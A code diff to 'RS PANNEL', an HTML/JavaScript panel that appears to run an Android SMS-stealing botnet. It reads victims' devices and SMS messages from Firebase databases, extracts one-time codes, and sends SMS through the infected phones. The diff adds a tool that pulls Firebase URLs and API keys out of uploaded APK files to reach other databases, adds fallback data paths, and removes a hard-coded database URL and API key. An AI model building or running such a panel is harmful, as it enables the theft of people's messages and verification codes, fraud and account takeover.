@@ -79,7 +79,7 @@
       padding: 24px;
     }
     .shell {
-      width: min(100%, 520px);
+      width: min(100%, 560px);
     }
     .brand {
       text-align: center;
@@ -270,6 +270,57 @@
       border-color: var(--cyan);
       box-shadow: 0 0 0 3px rgba(24, 191, 255, 0.08);
     }
+    .form-group .apk-upload {
+      display: flex;
+      gap: 12px;
+      align-items: center;
+      flex-wrap: wrap;
+    }
+    .form-group .apk-upload input[type="file"] {
+      display: none;
+    }
+    .form-group .apk-upload .file-label {
+      padding: 10px 18px;
+      background: var(--bg3);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      color: var(--text);
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: 0.2s;
+      flex: 1;
+      text-align: center;
+    }
+    .form-group .apk-upload .file-label:hover {
+      border-color: var(--cyan);
+      background: rgba(24, 191, 255, 0.04);
+    }
+    .form-group .apk-upload .file-status {
+      font-size: 12px;
+      color: var(--muted);
+      flex: 2;
+      min-width: 120px;
+    }
+    .form-group .apk-upload .extract-btn {
+      padding: 10px 20px;
+      background: var(--cyan);
+      border: 0;
+      border-radius: 12px;
+      color: #020810;
+      font-weight: 700;
+      font-size: 13px;
+      transition: 0.2s;
+    }
+    .form-group .apk-upload .extract-btn:hover {
+      background: #22e5ff;
+      transform: scale(1.02);
+    }
+    .form-group .apk-upload .extract-btn:disabled {
+      opacity: 0.4;
+      cursor: not-allowed;
+      transform: none;
+    }
     .form-actions {
       display: flex;
       gap: 12px;
@@ -316,6 +367,9 @@
       color: var(--muted);
       font-size: 12px;
       line-height: 1.6;
+    }
+    .notice strong {
+      color: var(--cyan);
     }
 
     /* ─── DASHBOARD ────────────────────────────────────────────────────── */
@@ -528,6 +582,7 @@
       cursor: pointer;
       transition: 0.15s ease;
       min-height: 220px;
+      position: relative;
     }
     .device-card:hover {
       border-color: var(--border2);
@@ -625,6 +680,25 @@
       color: var(--muted);
       padding: 70px 0;
       font-size: 14px;
+    }
+    .send-btn-small {
+      position: absolute;
+      top: 12px;
+      right: 12px;
+      background: rgba(24, 191, 255, 0.08);
+      border: 1px solid rgba(24, 191, 255, 0.15);
+      border-radius: 8px;
+      color: var(--cyan);
+      padding: 4px 10px;
+      font-size: 14px;
+      cursor: pointer;
+      transition: 0.15s;
+      opacity: 0.5;
+      z-index: 2;
+    }
+    .send-btn-small:hover {
+      opacity: 1;
+      background: rgba(24, 191, 255, 0.15);
     }
 
     /* ─── MODALS ────────────────────────────────────────────────────────── */
@@ -945,6 +1019,10 @@
         max-width: 90%;
         text-align: center;
       }
+      .form-group .apk-upload {
+        flex-direction: column;
+        align-items: stretch;
+      }
     }
   </style>
 </head>
@@ -972,7 +1050,7 @@
       <button class="btn-new" id="newConnBtn">＋ New Firebase Connection</button>
       <div id="homeError" class="error-text hidden"></div>
     </div>
-    <div class="footer-text">RS PANNEL · v2.0 · Telegram @RSPANNEL</div>
+    <div class="footer-text">RS PANNEL · v3.0 · Telegram @RSPANNEL</div>
   </div>
 </section>
 
@@ -986,24 +1064,38 @@
     <div class="card form-card">
       <button class="back" id="backBtn">‹</button>
       <div class="title">New Firebase Connection</div>
+
+      <!-- APK EXTRACT SECTION -->
+      <div class="form-group">
+        <label>📦 Extract from APK (Optional)</label>
+        <div class="apk-upload">
+          <input type="file" id="apkFileInput" accept=".apk" />
+          <label class="file-label" for="apkFileInput">Choose APK</label>
+          <span class="file-status" id="apkStatus">No file selected</span>
+          <button class="extract-btn" id="extractBtn">Extract</button>
+        </div>
+        <div style="font-size:11px;color:var(--dim);margin-top:6px;">Upload an APK to auto‑extract Firebase URL &amp; API Key from google-services.json</div>
+      </div>
+
       <div class="form-group">
         <label>Friendly Label</label>
         <input id="labelInput" placeholder="e.g. My Project" value="Pikachu" />
       </div>
       <div class="form-group">
-        <label>Database URL</label>
-        <input id="urlInput" placeholder="https://project.firebaseio.com" value="https://admin-no-43-default-rtdb.firebaseio.com" />
+        <label>Firebase Database URL</label>
+        <input id="urlInput" placeholder="https://project.firebaseio.com" />
       </div>
       <div class="form-group">
         <label>Web API Key</label>
-        <input id="keyInput" type="password" placeholder="AIza..." value="AIzaSyCvVqCRv7qZQwYxItXwj8Nj1s4gFmpZ2I" />
+        <input id="keyInput" type="password" placeholder="AIza..." />
       </div>
+
       <div class="form-actions">
         <button class="primary" id="saveConnBtn">⚡ Connect</button>
         <button class="secondary" id="cancelBtn">Cancel</button>
       </div>
       <div id="setupError" class="error-text hidden"></div>
-      <div class="notice">🔒 Reads <strong>/clients</strong> for devices and <strong>/messages</strong> for SMS</div>
+      <div class="notice">🔒 Reads <strong>/clients</strong> for devices and <strong>/messages</strong> for SMS<br />Fallback: <strong>/devices, /users, /register</strong></div>
     </div>
   </div>
 </section>
@@ -1121,6 +1213,7 @@
   </div>
 </div>
 
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <script>
   // ─── SECURE STORAGE ──────────────────────────────────────────────────
   const STORAGE_KEY = 'rs_pannel_conns';
@@ -1178,7 +1271,6 @@
     const t = $('toast');
     t.textContent = msg;
     t.className = `toast ${type}`;
-    // Force reflow
     void t.offsetWidth;
     t.classList.add('show');
     clearTimeout(t._hide);
@@ -1188,15 +1280,6 @@
   function esc(str) {
     if (!str) return '';
     return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
-  }
-
-  function fmtPhone(num) {
-    if (!num) return '—';
-    const s = String(num).replace(/\D/g, '');
-    if (s.length >= 10) {
-      return '+' + s;
-    }
-    return s || '—';
   }
 
   function extractOTP(text) {
@@ -1223,6 +1306,9 @@
     $('dashboardScreen').style.display = 'none';
     $('setupScreen').classList.remove('hidden');
     $('setupError').classList.add('hidden');
+    // Reset APK status
+    $('apkStatus').textContent = 'No file selected';
+    $('apkFileInput').value = '';
   }
 
   function showDashboard() {
@@ -1264,13 +1350,112 @@
             localData.connections.splice(idx, 1);
             saveConns(localData);
             renderConnections();
-            showToast('Connection removed', 'success');
+            showToast('Removed', 'success');
           }
         });
       });
       container.appendChild(div);
     });
   }
+
+  // ─── APK EXTRACTION ──────────────────────────────────────────────────
+  let extractedUrl = '';
+  let extractedKey = '';
+
+  $('apkFileInput').addEventListener('change', function(e) {
+    const file = this.files[0];
+    if (file) {
+      $('apkStatus').textContent = file.name + ' (' + (file.size / 1024).toFixed(1) + ' KB)';
+      $('extractBtn').disabled = false;
+    } else {
+      $('apkStatus').textContent = 'No file selected';
+      $('extractBtn').disabled = true;
+    }
+  });
+
+  $('extractBtn').addEventListener('click', async function() {
+    const input = $('apkFileInput');
+    const file = input.files[0];
+    if (!file) {
+      showToast('Select an APK first', 'error');
+      return;
+    }
+
+    this.disabled = true;
+    this.textContent = '⏳ Extracting...';
+    $('apkStatus').textContent = 'Reading APK...';
+
+    try {
+      const arrayBuffer = await file.arrayBuffer();
+      const zip = await JSZip.loadAsync(arrayBuffer);
+
+      // Look for google-services.json
+      let jsonFile = zip.file('google-services.json');
+      if (!jsonFile) {
+        // Try common alternate paths
+        const possible = [
+          'google-services.json',
+          'res/raw/google-services.json',
+          'assets/google-services.json'
+        ];
+        for (const p of possible) {
+          const f = zip.file(p);
+          if (f) {
+            jsonFile = f;
+            break;
+          }
+        }
+      }
+
+      if (!jsonFile) {
+        showToast('google-services.json not found in APK', 'error');
+        this.textContent = 'Extract';
+        this.disabled = false;
+        $('apkStatus').textContent = 'No google-services.json found';
+        return;
+      }
+
+      const content = await jsonFile.async('string');
+      const config = JSON.parse(content);
+
+      // Extract database URL and API key
+      let dbUrl = '';
+      let apiKey = '';
+      if (config.project_info && config.project_info.firebase_url) {
+        dbUrl = config.project_info.firebase_url;
+      }
+      if (config.client && config.client.length > 0) {
+        const client = config.client[0];
+        if (client.api_key && client.api_key.length > 0) {
+          apiKey = client.api_key[0].current_key || '';
+        }
+      }
+
+      if (!dbUrl || !apiKey) {
+        showToast('Could not extract both URL and API key from google-services.json', 'error');
+        this.textContent = 'Extract';
+        this.disabled = false;
+        $('apkStatus').textContent = 'Incomplete config';
+        return;
+      }
+
+      // Fill the form
+      $('urlInput').value = dbUrl;
+      $('keyInput').value = apiKey;
+      extractedUrl = dbUrl;
+      extractedKey = apiKey;
+
+      $('apkStatus').textContent = '✅ Extracted successfully!';
+      showToast('Firebase credentials extracted!', 'success');
+    } catch (e) {
+      console.error('Extract error:', e);
+      showToast('Extraction failed: ' + e.message, 'error');
+      $('apkStatus').textContent = 'Error: ' + e.message;
+    } finally {
+      this.textContent = 'Extract';
+      this.disabled = false;
+    }
+  });
 
   // ─── FIREBASE CONNECTION ─────────────────────────────────────────────
   let firebaseReady = false;
@@ -1512,7 +1697,6 @@
       const parent = this.closest('.sim-toggle');
       parent.querySelectorAll('button').forEach(b => b.classList.remove('active'));
       this.classList.add('active');
-      // Store sim globally for send
       selectedSim = parseInt(this.dataset.sim);
     });
   });
@@ -1581,6 +1765,7 @@
     list.forEach(d => {
       const card = document.createElement('div');
       card.className = 'device-card';
+      card.dataset.deviceId = d.id;
       const online = !!d.online;
       const smsCount = d.sms ? d.sms.length : 0;
       card.innerHTML = `
@@ -1602,6 +1787,21 @@
           <div class="item"><small>Network</small><div>${esc(d.network)}</div></div>
         </div>
       `;
+      // Send button
+      const sendBtn = document.createElement('button');
+      sendBtn.className = 'send-btn-small';
+      sendBtn.textContent = '✉';
+      sendBtn.addEventListener('click', function(e) {
+        e.stopPropagation();
+        $('sendDeviceSelect').value = d.id;
+        $('sendModal').classList.add('active');
+        $('sendResult').className = 'send-result';
+        $('sendResult').textContent = '';
+        if (d.number !== 'N/A') {
+          $('sendNumber').value = d.number;
+        }
+      });
+      card.appendChild(sendBtn);
       card.addEventListener('click', () => showDeviceDetail(d));
       grid.appendChild(card);
     });
@@ -1761,149 +1961,9 @@
     this.disabled = false;
   });
 
-  // ─── OPEN SEND MODAL ────────────────────────────────────────────────
-  // Add a send button to device cards or a dedicated button
-  // We'll add a small send icon on device cards
-  // Also add a global send button in the topbar
-
-  // Modify device card rendering to include a send button
-  const origRender = renderGrid;
-  renderGrid = function() {
-    // Call original
-    origRender();
-    // Add send buttons to device cards
-    document.querySelectorAll('.device-card').forEach((card, index) => {
-      // Check if already has send button
-      if (card.querySelector('.send-btn-small')) return;
-      const sendBtn = document.createElement('button');
-      sendBtn.className = 'send-btn-small';
-      sendBtn.textContent = '✉';
-      sendBtn.style.cssText = `
-        position: absolute;
-        top: 12px;
-        right: 12px;
-        background: rgba(24,191,255,0.08);
-        border: 1px solid rgba(24,191,255,0.15);
-        border-radius: 8px;
-        color: var(--cyan);
-        padding: 4px 10px;
-        font-size: 14px;
-        cursor: pointer;
-        transition: 0.15s;
-        opacity: 0.6;
-      `;
-      sendBtn.addEventListener('mouseenter', () => sendBtn.style.opacity = '1');
-      sendBtn.addEventListener('mouseleave', () => sendBtn.style.opacity = '0.6');
-      sendBtn.addEventListener('click', function(e) {
-        e.stopPropagation();
-        const deviceId = card.dataset.deviceId;
-        if (deviceId) {
-          $('sendDeviceSelect').value = deviceId;
-          $('sendModal').classList.add('active');
-          $('sendResult').className = 'send-result';
-          $('sendResult').textContent = '';
-        }
-      });
-      card.style.position = 'relative';
-      card.appendChild(sendBtn);
-    });
-  };
-
-  // Store deviceId on cards
-  const origRenderGrid = renderGrid;
-  renderGrid = function() {
-    const q = $('searchInput').value.toLowerCase();
-    let list = devices.filter(d => {
-      const filterOk = currentFilter === 'all' ||
-        (currentFilter === 'online' && d.online) ||
-        (currentFilter === 'offline' && !d.online);
-      const searchOk = (d.id + ' ' + d.name + ' ' + d.number).toLowerCase().includes(q);
-      return filterOk && searchOk;
-    });
-    list.sort((a, b) => {
-      const aTime = a.lastSeen || 0;
-      const bTime = b.lastSeen || 0;
-      return sortAsc ? aTime - bTime : bTime - aTime;
-    });
-
-    $('totalStat').textContent = devices.length;
-    $('onlineStat').textContent = devices.filter(d => d.online).length;
-    $('offlineStat').textContent = devices.filter(d => !d.online).length;
-
-    const grid = $('deviceGrid');
-    grid.innerHTML = '';
-    if (!list.length) {
-      grid.innerHTML = '<div class="empty-grid">No devices found</div>';
-      return;
-    }
-    list.forEach(d => {
-      const card = document.createElement('div');
-      card.className = 'device-card';
-      card.dataset.deviceId = d.id;
-      const online = !!d.online;
-      const smsCount = d.sms ? d.sms.length : 0;
-      card.innerHTML = `
-        <div class="top">
-          <div class="icon ${online ? 'online' : ''}">${online ? '◉' : '◌'}</div>
-          <div class="info">
-            <div class="name">${esc(d.name)}</div>
-            <div class="sub">
-              <span>${esc(d.id.slice(0, 8))}…</span>
-              ${d.battery !== 'N/A' ? '· 🔋 ' + esc(d.battery) : ''}
-              ${smsCount > 0 ? '· 📩 ' + smsCount : ''}
-            </div>
-          </div>
-        </div>
-        <div class="details">
-          <div class="item"><small>Platform</small><div>${esc(d.platform)}</div></div>
-          <div class="item"><small>Status</small><div>${online ? '<span class="online-dot"></span>Online' : '<span class="offline-dot"></span>Offline'}</div></div>
-          <div class="item"><small>Number</small><div>${esc(d.number)}</div></div>
-          <div class="item"><small>Network</small><div>${esc(d.network)}</div></div>
-        </div>
-      `;
-      // Send button
-      const sendBtn = document.createElement('button');
-      sendBtn.className = 'send-btn-small';
-      sendBtn.textContent = '✉';
-      sendBtn.style.cssText = `
-        position: absolute;
-        top: 12px;
-        right: 12px;
-        background: rgba(24,191,255,0.08);
-        border: 1px solid rgba(24,191,255,0.15);
-        border-radius: 8px;
-        color: var(--cyan);
-        padding: 4px 10px;
-        font-size: 14px;
-        cursor: pointer;
-        transition: 0.15s;
-        opacity: 0.5;
-        z-index: 2;
-      `;
-      sendBtn.addEventListener('mouseenter', () => sendBtn.style.opacity = '1');
-      sendBtn.addEventListener('mouseleave', () => sendBtn.style.opacity = '0.5');
-      sendBtn.addEventListener('click', function(e) {
-        e.stopPropagation();
-        $('sendDeviceSelect').value = d.id;
-        $('sendModal').classList.add('active');
-        $('sendResult').className = 'send-result';
-        $('sendResult').textContent = '';
-        // Set default number from device
-        if (d.number !== 'N/A') {
-          $('sendNumber').value = d.number;
-        }
-      });
-      card.style.position = 'relative';
-      card.appendChild(sendBtn);
-
-      card.addEventListener('click', () => showDeviceDetail(d));
-      grid.appendChild(card);
-    });
-  };
-
   // ─── INIT ─────────────────────────────────────────────────────────────
   renderConnections();
-  console.log('[RS PANNEL] Ready — Dark X style');
+  console.log('[RS PANNEL] Ready — with APK extraction');
 </script>
 </body>
 </html>
